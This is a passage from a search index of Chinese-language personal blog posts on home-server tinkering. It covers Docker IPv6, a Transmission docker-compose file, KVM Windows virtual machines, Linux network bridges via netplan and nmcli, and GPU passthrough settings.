network\u624d\u53ef\u4ee5\u4e0d\u542f\u7528ipv6\uff09</p> <p>If you configure Docker for IPv6 support (see Use IPv6), the default bridge network is also configured for IPv6 automatically. Unlike user-defined bridges, you can\u2019t selectively disable IPv6 on the default bridge.</p> <p>\u6211\u7684\u8def\u7531\u5668\u5f97\u5230\u7684ipv6\u662f<code>2001:da8:d800:336:8e53:c3ff:fe86:123d/64</code>\uff0c\u5e94\u8be5\u662f\u6709\u4e00\u4e2ablock\u7684\u3002\u4f46\u662f\u5f53\u6211\u8bbe\u7f6e\u4e86daemon.json\u5185<code>fixed-cidr-v6</code>\u4e3a<code>2001:da8:d800:336::/64</code>\u540e\u3002\u9ed8\u8ba4\u7684bridge docker0\u663e\u793aip\u662f<code>2001:da8:d800:336::1/64</code>\u3002\u5bb9\u5668\u5185\u786e\u5b9e\u83b7\u5f97\u4e86ipv6\u5730\u5740\uff0c\u4f46\u662f\u65e0\u6cd5ping\u901ahost\u7269\u7406\u7f51\u5361\u4e0a\u7684ipv6\u5730\u5740\u3002\u4e5f\u65e0\u6cd5ping\u901a\u8def\u7531\u5668\u3002</p> <ul> <li>\u6240\u4ee5\u611f\u89c9\u8def\u7531\u5668\u5f97\u5230\u7684/64\u7684\u5757\u5e76\u4e0d\u5c5e\u4e8e\u6211\uff0c\u6ca1\u529e\u6cd5\u8fd9\u6837\u914d\u7f6e\u3002</li> <li>\u53ef\u80fd\u8fd8\u662f\u5f97\u914d\u7f6enat\u3002\u4f46\u662f\u4f7f\u7528ipv6\u7684\u8fd8\u662f\u5c11\u6570\uff08PT\u4e0b\u8f7d\u9700\u8981\uff09\uff0c\u56e0\u6b64\u8fd8\u662f\u4f7f\u7528host\u7f51\u7edc\u7c7b\u578b\u5427\u3002</li> </ul>","tags":["ntfs","samba","portainer","KVM","LXD","docker"]},{"location":"%E6%8A%98%E8%85%BE/2022/07/11/2022-07-11-%E5%8F%B0%E5%BC%8F%E6%9C%BA%E6%94%B9%E9%80%A0%E8%AE%A1%E5%88%92/#docker\u5e94\u7528","title":"Docker\u5e94\u7528","text":"","tags":["ntfs","samba","portainer","KVM","LXD","docker"]},{"location":"%E6%8A%98%E8%85%BE/2022/07/11/2022-07-11-%E5%8F%B0%E5%BC%8F%E6%9C%BA%E6%94%B9%E9%80%A0%E8%AE%A1%E5%88%92/#transmission-pt\u4e0b\u8f7d","title":"transmission PT\u4e0b\u8f7d","text":"<p>\u8bf4\u660e\uff1atransmission\u662flinux\u4e0b\u7684BT\u4e0b\u8f7d\u8f6f\u4ef6\uff0c\u53ef\u4ee5\u901a\u8fc7\u7f51\u9875\u63a7\u5236\uff0c\u6709docker\u7248\u672c\u3002</p> <p>\u6311\u6218\uff1a\u7531\u4e8ePT\u4e00\u822c\u662f\u53ea\u80fdipv6\u8bbf\u95ee\u7684\uff0c\u56e0\u6b64\u8981\u6c42docker\u5bb9\u5668\u80fd\u591fipv6\u8bbf\u95ee\u3002\u53d1\u73b0\u6700\u7b80\u5355\u7684\u65b9\u5f0f\u5c31\u662f\u7f51\u7edc\u7c7b\u578b\u9009\u62e9host\u3002</p> <p>\u4ee5\u4e0bdocker compose\u662ftransmission\u5b98\u65b9\u63d0\u4f9b\u7684\uff0c\u4e3b\u8981\u4fee\u6539\u4e86\u5176\u4e2dnetwork_mode\u3002</p> <ul> <li>\u5176\u4e2dTRANSMISSION_WEB_HOME\u6307\u5b9a\u7f51\u9875\u76ae\u80a4\uff0c\u4f7f\u7528ronggang/transmission-web-control: \u4e00\u4e2a Transmission \u6d4f\u89c8\u5668\u7ba1\u7406\u754c\u9762\u3002Transmission Web Control is a custom web UI. (github.com)</li> <li>\u4f7f\u7528\u5b83\u7684\u811a\u672c\u5b89\u88c5\u6709\u70b9\u95ee\u9898\uff0c\u4e3b\u8981\u662f\u7f51\u7edc\u4e0b\u8f7d\u4e0d\u4e0b\u6765\u3002</li> <li>\u5c06git\u4ed3\u5e93\u4e2d\u7684src\u76ee\u5f55\u8986\u76d6\u5230\u5bb9\u5668\u4e2d\u539f\u672c\u7684web\u76ee\u5f55\u5373\u53ef</li> <li>\u7136\u540e\u6700\u597d\u4fee\u6539\u4e00\u4e0bTRANSMISSION_WEB_HOME\u4f4d\u7f6e</li> </ul> <pre><code>---\nversion: \"2.1\"\nservices:\n  transmission:\n    image: lscr.io/linuxserver/transmission:latest\n    container_name: transmission\n    environment:\n      - PUID=1000\n      - PGID=1000\n      - TZ=ASIA/ShangHai\n      - USER=yfy\n      - PASS=abcd4567\n      - PEERPORT=51413\n      - TRANSMISSION_WEB_HOME=/downloads/transmission/web\n    volumes:\n      - /home/yfy/Disk/BT/config:/config\n      - /home/yfy/Disk/BT/downloads:/downloads\n      - /home/yfy/Disk/BT/watch:/watch\n    network_mode: \"host\"\n    restart: unless-stopped\n</code></pre>","tags":["ntfs","samba","portainer","KVM","LXD","docker"]},{"location":"%E6%8A%98%E8%85%BE/2022/07/11/2022-07-11-%E5%8F%B0%E5%BC%8F%E6%9C%BA%E6%94%B9%E9%80%A0%E8%AE%A1%E5%88%92/#jellyfin","title":"jellyfin","text":"","tags":["ntfs","samba","portainer","KVM","LXD","docker"]},{"location":"%E6%8A%98%E8%85%BE/2022/07/16/2022-07-16-Linux%E5%AE%89%E8%A3%85windows%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%B9%B6%E6%98%BE%E5%8D%A1%E7%9B%B4%E9%80%9A/","title":"Linux\u5b89\u88c5windows\u865a\u62df\u673a\u5e76\u663e\u5361\u76f4\u901a","text":"","tags":["gcc","mpi"]},{"location":"%E6%8A%98%E8%85%BE/2022/07/16/2022-07-16-Linux%E5%AE%89%E8%A3%85windows%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%B9%B6%E6%98%BE%E5%8D%A1%E7%9B%B4%E9%80%9A/#\u8bf4\u660e","title":"\u8bf4\u660e","text":"<p>\u5728linux\u4e0a\u4f7f\u7528KVM\u5b89\u88c5windows\u865a\u62df\u673a\u3002\u7136\u540e\u5c06\u663e\u5361\u76f4\u901a(pci passthrough)\u8fdb\u865a\u62df\u673a\uff0c\u4ece\u800c\u53ef\u4ee5\u5728Windows\u865a\u62df\u673a\u4e0a\u6253\u6e38\u620f\u3002</p> <p>\u8fbe\u5230\u4e00\u53f0\u673a\u5668\u540c\u65f6\u8fd0\u884c\u4e24\u4e2a\u7cfb\u7edf\uff0c\u5145\u5206\u5229\u7528\u786c\u4ef6\u3002</p>","tags":["gcc","mpi"]},{"location":"%E6%8A%98%E8%85%BE/2022/07/16/2022-07-16-Linux%E5%AE%89%E8%A3%85windows%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%B9%B6%E6%98%BE%E5%8D%A1%E7%9B%B4%E9%80%9A/#\u7cfb\u7edf\u4fe1\u606f","title":"\u7cfb\u7edf\u4fe1\u606f","text":"<ul> <li>CPU: AMD Ryzen\u2122 7 5800X</li> <li>RAM: Gloway DDR4 2666MHz 32GB</li> <li>GPU slot1: Zotac GTX 1060 3g</li> <li>GPU slot2: Yeston RX550 2g</li> <li>\u4e3b\u677f\uff1aASUS TUF GAMING B550M-PLUS (WI-FI)</li> <li>M.2 slot1: Samsung PM9A1 1TB</li> <li>M.2 slot2: KIOXIA RC10 500GB</li> <li>SATA: \u897f\u6570\u7d2b\u76d8 2TB</li> </ul>","tags":["gcc","mpi"]},{"location":"%E6%8A%98%E8%85%BE/2022/07/16/2022-07-16-Linux%E5%AE%89%E8%A3%85windows%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%B9%B6%E6%98%BE%E5%8D%A1%E7%9B%B4%E9%80%9A/#\u534e\u7855b550m\u4e3b\u677f","title":"\u534e\u7855B550m\u4e3b\u677f","text":"<p>\u5b98\u65b9\u53c2\u6570\uff1aTUF GAMING B550M-PLUS (WI-FI) - Tech Specs\uff5cMotherboards\uff5cASUS Global</p> <ul> <li>PCIe slots</li> <li>\u6765\u81earyzen 5000 CPU\uff08\u975eG\uff0c\u5426\u5219\u4e3aPCIE 3.0\uff09<ul> <li>1 x PCIe x16 (4.0x16 mode)</li> </ul> </li> <li>\u6765\u81eaB550 chipset<ul> <li>1 x PCIe x16 (3.0x4 mode)</li> <li>1 x PCIe x1   *1 PCIEX16_2 will run x2 mode when PCIEX1 is used.</li> </ul> </li> <li>Storage</li> <li>2 M.2\uff1aCPU(PCIE4.0 x4), PCH(PCIE3.0 x4)</li> <li>4 SATA 6Gb/s\uff1aPCH</li> </ul>","tags":["gcc","mpi"]},{"location":"%E6%8A%98%E8%85%BE/2022/07/16/2022-07-16-Linux%E5%AE%89%E8%A3%85windows%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%B9%B6%E6%98%BE%E5%8D%A1%E7%9B%B4%E9%80%9A/#\u57fa\u672cwindows\u865a\u62df\u673a","title":"\u57fa\u672cwindows\u865a\u62df\u673a","text":"<p>\u672c\u90e8\u5206\u521b\u5efa\u4e00\u4e2a\u53ef\u7528\u7684windows\u865a\u62df\u673a\uff0c\u867d\u7136\u6ca1\u6709\u663e\u5361\uff0c\u4f46\u662f\u4e5f\u80fd\u5b8c\u6210\u5f88\u591a\u4e8b\u60c5\uff0c\u6bd4\u5982\u6302\u673a\u5f55\u5c4f\u3002</p>","tags":["gcc","mpi"]},{"location":"%E6%8A%98%E8%85%BE/2022/07/16/2022-07-16-Linux%E5%AE%89%E8%A3%85windows%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%B9%B6%E6%98%BE%E5%8D%A1%E7%9B%B4%E9%80%9A/#\u901a\u8fc7virt-manger\u521b\u5efa\u865a\u62df\u673a","title":"\u901a\u8fc7virt-manger\u521b\u5efa\u865a\u62df\u673a","text":"<p>libvirt\u662f\u4e00\u4e2a\u5f00\u6e90\u7684\u865a\u62df\u673a\u7ba1\u7406API\uff0c\u53ef\u4ee5\u7ba1\u7406KVM, Xen, VMvare, QEMU\u7b49\u865a\u62df\u5316\u5de5\u5177\u7684\u865a\u62df\u673a\u3002\u5305\u542b\u5e93(libvirt)\u3001\u547d\u4ee4\u884c\u5de5\u5177(virsh)\u3001\u548cvirt-manger\u7b49GUI\u5de5\u5177\u3002\u53c2\u8003\uff1ahttps://wiki.libvirt.org/page/FAQ</p> <p>\u4f7f\u7528virt-manger\u521b\u5efawin10\u865a\u62df\u673a\uff0c\u8be6\u7ec6\u6b65\u9aa4\u53c2\u8003\uff1aHow To Install Windows 10 on Ubuntu KVM? \u2013 Getlabsdone.com\u3002\u8fd9\u91cc\u5c31\u4e0d\u518d\u8be6\u7ec6\u4ecb\u7ecd\u4e86\uff0c\u53ea\u63d0\u4e00\u4e9b\u6ce8\u610f\u70b9\u3002</p>","tags":["gcc","mpi"]},{"location":"%E6%8A%98%E8%85%BE/2022/07/16/2022-07-16-Linux%E5%AE%89%E8%A3%85windows%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%B9%B6%E6%98%BE%E5%8D%A1%E7%9B%B4%E9%80%9A/#\u6dfb\u52a0\u78c1\u76d8\u4e0d\u540c\u65b9\u5f0f","title":"\u6dfb\u52a0\u78c1\u76d8\u4e0d\u540c\u65b9\u5f0f","text":"<p>\u6dfb\u52a0\u78c1\u76d8\u6709\u591a\u79cd\u65b9\u5f0f\uff0c\u4e0d\u540c\u65b9\u5f0f\u7684\u6027\u80fd\u5bf9\u6bd4\uff1a(89) Adding VirtIO and passthrough storage in Virtual Machine Manager - YouTube - \u521b\u5efaqcow2\u6587\u4ef6   - \u53ef\u4ee5\u9009\u62e9virtio, SATA\u7b49\u603b\u7ebf\u534f\u8bae\u3002virtio\u6027\u80fd\u6700\u597d\uff0c\u4f46\u662f\u5b89\u88c5windows\u65f6\u9700\u8981\u989d\u5916\u5b89\u88c5\u9a71\u52a8\u3002 - \u5229\u7528\u5df2\u6709\u78c1\u76d8\u5206\u533a\uff0c\u540c\u6837\u53ef\u4ee5\u9009\u62e9virtio, SATA\u7b49\u603b\u7ebf\u534f\u8bae\u3002 - pci\u76f4\u901a\u78c1\u76d8</p>","tags":["gcc","mpi"]},{"location":"%E6%8A%98%E8%85%BE/2022/07/16/2022-07-16-Linux%E5%AE%89%E8%A3%85windows%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%B9%B6%E6%98%BE%E5%8D%A1%E7%9B%B4%E9%80%9A/#\u5b89\u88c5qxl\u9a71\u52a8","title":"\u5b89\u88c5QXL\u9a71\u52a8","text":"<ul> <li>\u5728\u5b89\u88c5\u597dwindows\u865a\u62df\u673a\u540e\uff0c\u8fd0\u884cvirtio drivers iso\u4e2d\u7684<code>virtio-win-guest-tools.exe</code>\uff0c\u8be5\u7a0b\u5e8f\u4f1a\u5b89\u88c5\u5176\u4f59\u9a71\u52a8\u7a0b\u5e8f\u3002\u6bd4\u8f83\u91cd\u8981\u7684\u662fQXL\u663e\u793a\u9002\u914d\u5668\u9a71\u52a8\uff0c\u8be5\u9a71\u52a8\u4f1a\u4f7f\u5f97\u663e\u793a\u66f4\u52a0\u6d41\u7545</li> </ul> <p>\u6b64\u65f6windows\u865a\u62df\u673a\u5df2\u7ecf\u53ef\u4ee5\u4f7f\u7528\u4e86\u3002\u4f46\u662f\u521b\u5efa\u865a\u62df\u673a\u65f6\uff0c\u9ed8\u8ba4\u4f1a\u4f7f\u7528\u9ed8\u8ba4\u7684\u7f51\u6865<code>virbr0</code>\uff0c\u800c\u5b83\u662fNAT\u7684\uff0c\u6709\u81ea\u5df1\u7684\u5730\u5740\u6bb5\u3002\u56e0\u6b64host\u53ef\u4ee5\u8bbf\u95ee\u865a\u62df\u673a\uff0c\u4f46\u662f\u4ecehost\u5916\u65e0\u6cd5\u8bbf\u95ee\u865a\u62df\u673a\u3002</p> <p>\u4e3a\u4e86\u8ba9\u5176\u5b83\u8bbe\u5907\u4e5f\u80fd\u81ea\u7531\u8bbf\u95ee\u865a\u62df\u673a\uff0c\u9700\u8981\u8bbe\u7f6e\u4e0b\u9762\u8981\u4ecb\u7ecd\u7684\u865a\u62df\u7f51\u6865</p>","tags":["gcc","mpi"]},{"location":"%E6%8A%98%E8%85%BE/2022/07/16/2022-07-16-Linux%E5%AE%89%E8%A3%85windows%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%B9%B6%E6%98%BE%E5%8D%A1%E7%9B%B4%E9%80%9A/#\u4fee\u6539\u4e3a\u6865\u63a5\u7f51\u7edc","title":"\u4fee\u6539\u4e3a\u6865\u63a5\u7f51\u7edc","text":"<p>\u4f7f\u7528docker\u3001lxc\u3001libvirt\u65f6\uff0c\u90fd\u4f1a\u521b\u5efa\u9ed8\u8ba4\u7684bridge\u8bbe\u5907\uff0c\u5982virbr0\u4fbf\u662flibvirt\u521b\u5efa\u7684\u3002 <pre><code>\u279c  ~ brctl show\nbridge name     bridge id               STP enabled     interfaces\nbr-d1cfd67efd10         8000.0242abdcc8f5       no              veth461ccef\nbr0             8000.be316828842b       yes             enp7s0\n                                                        vnet1\ndocker0         8000.0242ff18344e       no              veth2305c74\n                                                        veth69f27d6\nlxdbr0          8000.00163ecbf2fc       no\nvirbr0          8000.525400bf6a2c       yes             vnet0\n</code></pre></p> <p>libvirt\u521b\u5efa\u4e0d\u540c\u7c7b\u578b\u7f51\u7edc\u53c2\u8003\uff1aNetworking - Libvirt Wiki - nat\uff1a\u865a\u62df\u673a\u4f4d\u4e8e\u4e00\u4e2a\u865a\u62df\u7684\u7f51\u6bb5\uff0c\u901a\u8fc7nat\u5230\u5bbf\u4e3b\u673a\u4e0a\u7f51\u3002libvirt\u9ed8\u8ba4\u63d0\u4f9b\u4e00\u4e2a\u53eb\u505a<code>default</code>\u7684\u7f51\u7edc - bridge\uff1a\u865a\u62df\u673a\u548c\u7269\u7406\u673a\u5171\u4eab\u7f51\u7edc\u3002</p> <p>\u865a\u62df\u673a\u60f3\u8981\u4f7f\u7528bridge\u6a21\u5f0f\u6765\u8bf4\uff0c\u5206\u4e3a\u4e24\u6b65 - \u5728linux\u4e2d\u521b\u5efabridge\u8bbe\u5907 - virt-manger\u4e2d\u521b\u5efa\u7f51\u7edc\uff0c\u4f7f\u7528\u8be5bridge\u8bbe\u5907</p>","tags":["gcc","mpi"]},{"location":"%E6%8A%98%E8%85%BE/2022/07/16/2022-07-16-Linux%E5%AE%89%E8%A3%85windows%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%B9%B6%E6%98%BE%E5%8D%A1%E7%9B%B4%E9%80%9A/#netplannetworkd\u521b\u5efabridge","title":"netplan/networkd\u521b\u5efabridge","text":"<p>ubuntu20.04\u8d77\u4f7f\u7528netplan\u7ba1\u7406\u7f51\u7edc\uff0c\u684c\u9762\u7248\u7684render\u4f7f\u7528NetworkManger\uff0c\u670d\u52a1\u5668\u7248\u5219\u4f7f\u7528networkd\u3002 - NetworkManger\u7528\u4e8e\u56fe\u5f62\u5316\u754c\u9762\u7ba1\u7406\u7f51\u7edc - networkd\u4f7f\u7528\u914d\u7f6e\u6587\u4ef6\u7ba1\u7406 \u5bf9\u4e8e\u590d\u6742\u7684\u7f51\u7edc\u6765\u8bf4\uff0c\u8fd8\u662fnetworkd\u66f4\u5408\u9002\u3002</p> <p>ps. \u8fd8\u6709\u5176\u5b83\u65b9\u5f0f\uff0c\u5982\u4f7f\u7528iproute2/ip, bridge-utils/brctl\u521b\u5efabridge\uff0c\u53c2\u8003\uff1aNetwork bridge - ArchWiki (archlinux.org)</p> <ul> <li>\u5173\u95edNetworkManger\uff0c\u542f\u52a8networkd <pre><code>sudo systemctl stop NetworkManager\nsudo systemctl disable NetworkManager\n\nsudo systemctl enable systemd-networkd\nsudo systemctl start systemd-networkd\n</code></pre></li> <li>\u7f16\u8f91\u914d\u7f6e\u6587\u4ef6</li> <li>eth0\u6539\u4e3a\u5b9e\u9645\u7f51\u5361\u540d\u5b57\uff0cpcie\u7f51\u5361\u524d\u7f00\u4e00\u822c\u4e3aenp</li> <li>\u5176\u4e2deth0 dchp4 false\u8868\u793a\u8be5\u63a5\u53e3\u4e0a\u4e0d\u4f1a\u5c1d\u8bd5\u53bbdhcp\u8bf7\u6c42ip\u5730\u5740\u3002\u8981\u60f3\u8bbf\u95eehost\uff0c\u9700\u8981\u901a\u8fc7br0\u7684ip\u5730\u5740 <pre><code>cd /etc/netplan/\n# \u5907\u4efd\u539f\u672c\u7684\u914d\u7f6e\nmv 01-xxx.yaml 01-xxx.yaml.bak\n\n# \u65b0\u5efa\u914d\u7f6e\nvim 10-yyy.yaml\n\nnetwork:\n  version: 2\n  renderer: networkd\n  ethernets:\n    eth0:\n      dhcp4: false\n      dhcp6: false\n  bridges:\n    br0:\n      dhcp4: true\n      dhcp6: true\n      interfaces:\n        - eth0\n</code></pre></li> <li>\u5e94\u7528`netplan apply </li> </ul>","tags":["gcc","mpi"]},{"location":"%E6%8A%98%E8%85%BE/2022/07/16/2022-07-16-Linux%E5%AE%89%E8%A3%85windows%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%B9%B6%E6%98%BE%E5%8D%A1%E7%9B%B4%E9%80%9A/#networkmanger\u4e0d\u63a8\u8350","title":"NetworkManger(\u4e0d\u63a8\u8350)","text":"<p>ubuntu20.04\u4f7f\u7528netplan\u7ba1\u7406\u7f51\u7edc\uff0c\u5176\u4e2d\u684c\u9762\u7248render\u4f7f\u7528NetworkManger\uff0c\u4e00\u4e9b\u6559\u7a0b\u4f7f\u7528/etc/network/interfaces\u521b\u5efabridge\u8bbe\u5907\u5df2\u7ecf\u4e0d\u9002\u7528\u4e86\u3002</p> <p>\u4f7f\u7528NetworkManger\u521b\u5efabridge\u53c2\u8003\uff1aHow to add network bridge with nmcli (NetworkManager) on Linux - nixCraft (cyberciti.biz)</p> <pre><code>nmcli con add ifname br0 type bridge con-name br0\nnmcli con add type bridge-slave ifname enp7s0 master br0\n</code></pre> <p>\u6ce8\u610f\u70b9 - \u542f\u7528\u4e86bridge\u8bbe\u5907\u65f6\uff0c\u9700\u8981\u5173\u95ed\u539f\u6709\u4ee5\u592a\u7f51\u8bbe\u5907\u3002\u4e4b\u540e\u8bbf\u95ee\u673a\u5668\u5f97\u901a\u8fc7br0\u3002   <pre><code>sudo nmcli con down \"Wired connection 1\"\nsudo nmcli con up br0\n</code></pre>   - ssh\u8fde\u63a5\u65f6\u4f1a\u5bfc\u81f4\u8fde\u63a5\u65ad\u5f00\uff0c\u56e0\u6b64\u9700\u8981\u7528\u811a\u672c\u6267\u884c\u4e0a\u9762\u4e24\u6761\u547d\u4ee4\u3002   - \u65b0\u542f\u7528\u7684br0\u4f1a\u62e5\u6709LAN\u7684ip\u5730\u5740\uff0c\u4f46\u662f\u5730\u5740\u76f8\u8f83\u4e8e\u539f\u672c\u5730\u5740\u4f1a\u53d1\u751f\u6539\u53d8\u3002\u53ef\u4ee5\u5728\u8def\u7531\u5668\u4e2d\u770b\u5230\u65b0\u7684ip\u5730\u5740\uff0c\u7136\u540essh\u8fde\u63a5      - \u6216\u8005\u4f7f\u7528wifi\u7ef4\u6301\u53e6\u4e00\u4e2a\u7f51\u7edc\u8fde\u63a5 - \u65e0\u6cd5\u5728wifi\u8bbe\u5907\u4e0a\u521b\u5efabridge\uff0c\u53ea\u80fd\u662f\u6709\u7ebf\u4ee5\u592a\u7f51\u3002</p>","tags":["gcc","mpi"]},{"location":"%E6%8A%98%E8%85%BE/2022/07/16/2022-07-16-Linux%E5%AE%89%E8%A3%85windows%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%B9%B6%E6%98%BE%E5%8D%A1%E7%9B%B4%E9%80%9A/#virt-manger\u6dfb\u52a0\u7f51\u7edc","title":"virt-manger\u6dfb\u52a0\u7f51\u7edc","text":"<p>virt-manger\u4e2d\uff0c\u5728\u7f16\u8f91-&gt;\u8fde\u63a5\u8be6\u60c5-&gt;\u865a\u62df\u7f51\u7edc\u6dfb\u52a0\u4e00\u4e2a\u7f51\u7edc <pre><code>&lt;network&gt;\n  &lt;name&gt;br0&lt;/name&gt;\n  &lt;forward mode=\"bridge\"/&gt;\n  &lt;bridge name=\"br0\" /&gt;\n&lt;/network&gt;\n</code></pre></p>","tags":["gcc","mpi"]},{"location":"%E6%8A%98%E8%85%BE/2022/07/16/2022-07-16-Linux%E5%AE%89%E8%A3%85windows%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%B9%B6%E6%98%BE%E5%8D%A1%E7%9B%B4%E9%80%9A/#\u663e\u5361\u76f4\u901a","title":"\u663e\u5361\u76f4\u901a","text":"","tags":["gcc","mpi"]},{"location":"%E6%8A%98%E8%85%BE/2022/07/16/2022-07-16-Linux%E5%AE%89%E8%A3%85windows%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%B9%B6%E6%98%BE%E5%8D%A1%E7%9B%B4%E9%80%9A/#\u53c2\u8003\u8d44\u6599","title":"\u53c2\u8003\u8d44\u6599","text":"<ul> <li>\u6700\u5b8c\u6574\u7684Arch wiki\uff1aPCI passthrough via OVMF - ArchWiki (archlinux.org)</li> <li>KVM\u521b\u5efa\u865a\u62df\u673a\u5e76\u663e\u5361\u76f4\u901a\u8be6\u7ec6\u535a\u5ba2\uff1aCreating a Windows 10 kvm VM on the AMD Ryzen 9 3900X using VGA Passthrough - Heiko's Blog % Virtualization (heiko-sieger.info)</li> <li>\u5e2e\u52a9\u6211\u89e3\u51b3\u4e86windows\u84dd\u5c4f\u95ee\u9898\u7684\u535a\u5ba2\uff1aGPU passthrough - my switch to Linux - twenska is writing\u2026</li> <li>\u6bd4\u8f83\u597d\u7684github page\uff1aGPU Passthrough on GNU/Linux | gpu-passthrough (clayfreeman.github.io)</li> </ul> <p>PVE\u8d44\u6599 - https://pve.proxmox.com/wiki/PCI_Passthrough - Download (spice-space.org) - AMD 5000XT, 6000XT, reset bug: gnif/vendor-reset: Linux kernel vendor specific hardware reset module for sequences that are too complex/complicated to land in pci_quirks.c (github.com)</p>","tags":["gcc","mpi"]},{"location":"%E6%8A%98%E8%85%BE/2022/07/16/2022-07-16-Linux%E5%AE%89%E8%A3%85windows%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%B9%B6%E6%98%BE%E5%8D%A1%E7%9B%B4%E9%80%9A/#\u6b65\u9aa4\u603b\u7ed3","title":"\u6b65\u9aa4\u603b\u7ed3","text":"<p>\u5bf9\u4e8e\u53ef\u70ed\u63d2\u62d4\u7684\u8bbe\u5907\uff0c\u5728virt-manger\u4e2d\u6dfb\u52a0\u9700\u8981\u76f4\u901a\u7684host pci\u8bbe\u5907\u5373\u53ef\uff08\u53ef\u70ed\u63d2\u62d4\u7684\u8bbe\u5907\uff0c\u865a\u62df\u673a\u542f\u52a8\u65f6vfio_pci\u63a5\u7ba1\u8bbe\u5907\u9a71\u52a8\uff0c\u5173\u95ed\u865a\u62df\u673a\u65f6\uff0chost\u53ef\u91cd\u65b0\u8bbf\u95ee\uff09\uff0c\u4f46\u662f\u5bf9\u4e8e\u663e\u5361\u8fd9\u79cd\u65e0\u6cd5\u70ed\u63d2\u62d4\u7684\u8bbe\u5907\uff0c\u5219\u8f83\u4e3a\u590d\u6742\uff1a - \u9700\u8981\u901a\u8fc7lspci\u547d\u4ee4\uff0c\u67e5\u770bpci\u8bbe\u5907\u7684\u603b\u7ebf\u5730\u5740\uff0c\u8bbe\u5907id\uff0c\u4ee5\u53ca\u6240\u5904\u7684IOMMU group - \u5982\u679c\u663e\u5361\u5355\u72ec\u4f4d\u4e8e\u4e00\u4e2aIOMMU group\uff0c\u5219\u53ef\u4ee5\u76f4\u901a\uff0c\u53ef\u4ee5\u8fdb\u884c\u4e4b\u540e\u6b65\u9aa4   - \u5426\u5219\uff0c\u5c1d\u8bd5\u79fb\u52a8\u663e\u5361\u4f4d\u7f6e\uff08\u53e6\u4e00\u4e2apciex16\u7684\u69fd\uff09\uff0c\u770b\u662f\u5426\u4e3a\u5355\u72ecgroup   - \u4e0d\u884c\u7684\u8bdd\u9700\u8981\u5c1d\u8bd5ACS patch\uff08\u89c1\u540e\uff09\uff0c\u53ef\u80fd\u5bfc\u81f4\u4e0d\u7a33\u5b9a</p> <p>\u786e\u5b9a\u53ef\u4ee5\u76f4\u901a\u540e\u6b65\u9aa4\uff1a - bios\u5f00\u542f\u865a\u62df\u5316(intel: vt-x, AMD: SVM)\u548ciommu(intel: vt-d, AMD: AMD-Vi)\u652f\u6301   - \u4ee5\u6211\u7684AMD\u5e73\u53f0\u4e3a\u4f8b\uff0c\u9700\u8981\u5f00\u542fSVM\uff0cIOMMU\uff0cACS\uff08\u4f4d\u4e8eAMD CBS\u4e2d\uff0cBIOS\u4e2d\u641c\u7d22\u5173\u952e\u8bcd\u5373\u53ef\uff09 - virt-manger\u4e2d\u6dfb\u52a0pci\u8bbe\u5907\uff0c\u9009\u62e9\u663e\u5361group\u4e0b\u7684\u6240\u6709\u8bbe\u5907\uff08\u901a\u5e38\u53e6\u4e00\u4e2a\u4e3a\u58f0\u5361\uff09 - grub\u4fee\u6539\u5185\u6838\u542f\u52a8\u53c2\u6570\uff08grub2\u901a\u8fc7\u7f16\u8f91/etc/default/grub\uff0c\u7136\u540esudo update-grub\uff09   - \u5f00\u542fiommu   - \u5728\u542f\u52a8\u65f6\u5c06\u663e\u5361\u7ed1\u5b9a\u5230vifo_pci\u9a71\u52a8\u4e0a\uff08\u8fd8\u6709\u76f8\u540cgroup\u4e0b\u7684\u58f0\u5361\uff09   - \u6700\u7ec8\u6211\u7684\u542f\u52a8\u53c2\u6570\u793a\u4f8b   <pre><code>GRUB_CMDLINE_LINUX_DEFAULT=\"quiet splash amd_iommu=on vfio_pci.ids=10de:1d01,10de:0fb8 kvm.ignore_msrs=1\"\n</code></pre></p> <ul> <li>\u663e\u5361\u5904\u4e8e\u865a\u62df\u5316\u73af\u5883\u4e2d\u4f1a\u62d2\u7edd\u5de5\u4f5c\uff0c\u9700\u8981\u5728virt-manger XML\u4e2d\u6dfb\u52a0\u989d\u5916\u53c2\u6570\u3002\u53c2\u8003archiwiki</li> <li>vendor_id\uff1a\u5bf9\u4e8eNvidia\u7684\u663e\u5361\uff0c\u4f1a\u62a543\u9519\u8bef\u3002\u5728\u65e9\u671f\u7684\u9a71\u52a8\u9700\u8981\u4e0b\u9762\u7684vendor_id\uff0c\u4f46\u662f\u6700\u65b0\u7684\u663e\u5361\u9a71\u52a8\u5df2\u7ecf\u4e0d\u9700\u8981\u4e86\u3002\u5728windows\u5185\u66f4\u65b0\u663e\u5361\u9a71\u52a8\u4fbf\u4f1a\u6b63\u5e38\u5de5\u4f5c\u3002</li> <li>hidden\uff1a\u8ba9\u663e\u5361\u4e0d\u77e5\u9053\u4f4d\u4e8e\u865a\u62df\u673a\u4e2d\uff08windows\u8fd8\u662f\u77e5\u9053\u7684\uff09   <pre><code>&lt;features&gt;\n  ...\n  &lt;hyperv&gt;\n    ...\n    &lt;vendor_id state='on' value='randomid'/&gt;\n    ...\n  &lt;/hyperv&gt;\n  &lt;kvm&gt;\n    &lt;hidden state='on'/&gt;\n  &lt;/kvm&gt;\n  ...\n&lt;/features&gt;\n</code></pre></li> </ul>","tags":["gcc","mpi"]},{"location":"%E6%8A%98%E8%85%BE/2022/07/16/2022-07-16-Linux%E5%AE%89%E8%A3%85windows%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%B9%B6%E6%98%BE%E5%8D%A1%E7%9B%B4%E9%80%9A/#\u4ec0\u4e48\u662fiommu","title":"\u4ec0\u4e48\u662fIOMMU","text":"<p>\u5173\u4e8eIOMMU\u548cACS\uff1a</p> <p></p> <ul> <li>PCIE\u652f\u6301requst 